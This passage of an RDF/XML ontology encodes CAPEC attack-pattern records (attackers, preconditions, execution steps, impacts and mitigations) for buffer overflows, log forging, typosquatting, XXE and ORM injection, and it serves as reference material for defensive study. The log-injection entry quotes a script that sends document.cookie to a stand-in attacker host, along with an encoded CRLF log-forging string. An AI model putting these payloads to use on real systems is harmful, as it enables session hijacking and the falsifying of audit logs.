          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::441::610::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted system must have multiple stages processing of XML content.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To inject a bogus node in the XML routing table:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to insert or compromise a system into the processing path for the transaction.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker464">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#8">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Overflow in an API Call"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack464">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#8"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::119::118::74::20::680::733::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:An attacker can call an API exposed by the target host.::STEP:2:PHASE:Experiment:DESCRIPTION:On the probing stage  the attacker injects malicious code using the API call and observes the results. The attacker&apos;s goal is to uncover a buffer overflow vulnerability.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker finds a buffer overflow vulnerability  crafts malicious code and injects it through an API call. The attacker can at worst execute remote code on the target host.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::118::74::20::680::733::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host exposes an API to the user.::One or more API functions exposed by the target host has a buffer overflow vulnerability.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However  that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process  if bad character are left after decoding process  treat the data as suspicious  and fail the validation process.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::When client input is required from web-based forms  avoid using the GET method to submit data  as the method causes the form data to be appended to the URL and is easily manipulated. Instead  use the POST method whenever possible.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack469"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Carefully control access to physical log files.::Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data.::Use synchronization to control the flow of execution.::Use static analysis tools to identify log forging vulnerabilities.::Avoid viewing logs with tools that may interpret control characters in the file  such as command-line shells.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack471">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#93">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:268::NATURE:CanPrecede:CAPEC ID:592::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Log Injection-Tampering-Forging"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::117::75::150::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine Application&apos;s Log File Format) The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.TECHNIQUE:Determine logging utility being used by application (e.g. log4j):TECHNIQUE:Gain access to application&apos;s source code to determine log file formats.:TECHNIQUE:Install or obtain access to instance of application and observe its log file format.::STEP:2:PHASE:Exploit:DESCRIPTION:(Manipulate Log Files) The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.TECHNIQUE:Use carriage return and/or line feed characters to start a new line in the log file  and then  add a fake entry. For example: %250D%250A(Thu%2520Nov%252012%252011:22):Info:%2520User%2520admin%2520logged%2520in may add the following forged entry into a log file: (Thu Nov 12 12:11:22):Info: User admin logged in Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Insert a script into the log file such that if it is viewed using a web browser  the attacker will get a copy of the operator/administrator&apos;s cookie and will be able to gain access as that user. For example  a log file entry could contain &lt;script&gt;new Image().src=http://xss.attacker.com/log_cookie?cookie=+encodeURI(document.cookie);&lt;/script&gt; The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker330">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#531"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack330"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Physical access to the system or the integration facility where hardware components are kept.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker463">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#9">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Overflow in Local Command-Line Utilities"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack463">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#9"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::118::119::74::20::680::733::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Attacker identifies command utilities exposed by the target host.::STEP:2:PHASE:Experiment:DESCRIPTION:On the probing stage  the attacker interacts with the command utility and observes the results of its input. The attacker&apos;s goal is to uncover a buffer overflow in the command utility. For instance the attacker may find that input data are not properly validated.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker finds a buffer overflow vulnerability in the command utility and tries to exploit it. He crafts malicious code and injects it using the command utility. The attacker can at worst execute remote code on the target host.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::118::119::74::20::680::733::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host exposes a command-line utility to the user.::The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ robust authentication processes (e.g.  multi-factor authentication).::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack380">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#151">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Identity Spoofing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::287::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Authentication:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed  then implement a custom XmlResolver that has a request timeout  data retrieval limit  and restrict resources it can retrieve locally.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack461">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#221">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:122::NATURE:ChildOf:CAPEC ID:278::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XML External Entities Blowup"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::611::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker462">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#29"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack462"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::367::368::366::370::362::662::691::663::665::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A resource is access/modified concurrently by multiple processes.::The adversary is able to modify resource.::A race condition exists while accessing a resource.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can get sophisticated since the attack has to occur within a short interval of time.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker159">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#630">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:98::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#TypoSquatting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack159">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#630"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine target website) The adversary first determines which website to impersonate  generally one that is trusted and receives a consistent amount of traffic.TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:(Impersonate trusted domain) In order to impersonate the trusted domain  the adversary needs to register the TypoSquatted URL.TECHNIQUE:Register the TypoSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:(Deceive user into visiting domain) Finally  the adversary needs to deceive a user into visiting the TypoSquatted domain.TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.:TECHNIQUE:Assume that a user will incorrectly type the legitimate URL  leading the user to the TypoSquatted domain.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other Depending on the intention of the adversary  a successful TypoSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::An adversary requires knowledge of popular or high traffic domains  that could be used to deceive potential targets.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker461">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#221"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack461"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::611::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A server that has an implementation that accepts entities containing URI values.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker158">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#631"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack158"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::An adversary requires knowledge of popular or high traffic domains  that could be used to deceive potential targets.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker281">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#179"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack281"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker509">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#556"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack509"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker280">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#104">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:233::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cross Zone Scripting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack280">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#104"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::250::638::285::116::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Find systems susceptible to the attack) Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.TECHNIQUE:Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.::STEP:2:PHASE:Experiment:DESCRIPTION:(Find the insertion point for the payload) The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user&apos;s browser needs to be within the local machine zone.TECHNIQUE:Finding weaknesses in functionality used by both privileged and unprivileged users.::STEP:3:PHASE:Exploit:DESCRIPTION:(Craft and inject the payload) Develop the payload to be executed in the higher privileged zone in the user&apos;s browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.TECHNIQUE:The attacker makes it as likely as possible that the vulnerable functionality into which he has injected the payload has a high likelihood of being used by the victim.:TECHNIQUE:Leverage cross-site scripting vulnerability to inject payload.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::250::638::285::116::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be using a zone-aware browser.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker508">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#81"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack508"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::117::93::75::221::96::20::150::276::279::116::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target server software must be a HTTP server that performs web logging.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To input faked entries into Web logs:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to send specially formatted HTTP request to web server::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker507">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#509"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack507"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::552::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.::The adversary requires use of a third-party credential harvesting tool (e.g.  Mimikatz).::The adversary requires a brute force tool.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL::LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: Configure web server software to limit the waiting period on opened HTTP sessions Design: Use load balancing mechanisms::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack315">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#469">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:227::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#HTTP DoS"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::770::772::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker506">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#324"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack506"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker286">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#109">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:66::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Object Relational Mapping Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack286">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#109"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::20::100::89::564::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine Persistence Framework Used) An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.TECHNIQUE:An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume  for instance  that Hibernate is used and try to craft an attack from there.::STEP:2:PHASE:Explore:DESCRIPTION:(Probe for ORM Injection vulnerabilities) The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.::STEP:3:PHASE:Exploit:DESCRIPTION:(Perform SQL Injection through the generated data access layer) An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan  or potentially a particular way in which developer might have misused the generated code  to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.TECHNIQUE:An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::100::89::564::"/>
    <j.0:precondition>
